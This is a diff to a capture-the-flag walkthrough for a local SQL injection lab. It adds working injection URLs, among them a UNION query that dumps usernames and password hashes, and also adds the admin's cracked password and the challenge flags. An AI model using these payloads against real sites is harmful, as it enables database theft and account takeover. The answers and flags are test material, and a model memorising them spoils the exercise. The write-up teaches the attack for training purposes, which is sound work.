@@ -34,6 +34,13 @@ SQLi:
     - `select id, title, author, content FROM blog WHERE id = 1 OR 1=1  ORDER BY id DESC;";`
 - Look at that; we've altered the query itself! That's pretty sick! But what can we do with that? 
 
+### Flag #1 - Basic SQLi
+- The second SQLi example eabove is the perfect example for this. We simply want to grab ALL the posts in the database. Currently, we can only see three at a time. 
+- By using an ID of ``1 OR 1=1`` we are saying 'hey, bring in all of the posts!'.
+- Since one of the hidden posts has a flag, we now see the flag!
+- ``http://localhost:8080/blog.php?id=1 OR 1=1`` is the URL to get the flag. 
+- SC3{Come_out_all_ye_people_for_injections}
+
 ### UNION Operator 
 The main goal of the challenge is to get into the admin panel.  
 If we have the ability to siphon arbitrary data out of the database (because we control the query) we can steal data from the *users* table.   
@@ -74,19 +81,25 @@ This results in the following query that returns all data from the users table:
 ```
 select id, title, author, content FROM blog WHERE id = 3 UNION select 1, username, password,1 FROM users; -- ORDER BY id DESC;
 ```
+- The full URL looks like this: 
+	- http://localhost:8080/blog.php?id=0%20UNION%20select%201,%20username,%20password,1%20FROM%20users;%20--
+- For points for the flag, use the admin hash to get another flag: 
+	- Hash for 'admin' 5a2207692843e047f337502c63c318dd
+
 
 ### Getting the Password 
-Well crap... these aren't passwords! They are hashed passwords.  
-Hashing is used so that (in the event of a data breach) username and passwords cannot instantly be used. For more on hash functions, visit https://en.wikipedia.org/wiki/Hash_function....  
-These are just md5 hashs. Put one of the hashes into a site like https://crackstation.net/ will get the password very quickly (md5 is a very weak hashing algorithm).  
+- Well crap... these aren't passwords! They are hashed passwords.  
+- Hashing is used so that (in the event of a data breach) username and passwords cannot instantly be used. For more on hash functions, visit https://en.wikipedia.org/wiki/Hash_function....  
+- These are just md5 hashs. Put one of the hashes into a site like https://crackstation.net/ will get the password very quickly (md5 is a very weak hashing algorithm).   
 
 Just in case though: 
 - admin: almostthere 
 - hashing: hashing
 
-### Flag! 
-Now, go to login page and use the username and password to login! :)   
-Your flag will be waiting for you on the admin panel!
+- Now, go to login page and use the username and password to login! :)   
+- Your flag will be waiting for you on the admin panel!
+-  SC3{SQLi_t0_site_compromise!}
+
 
     
 
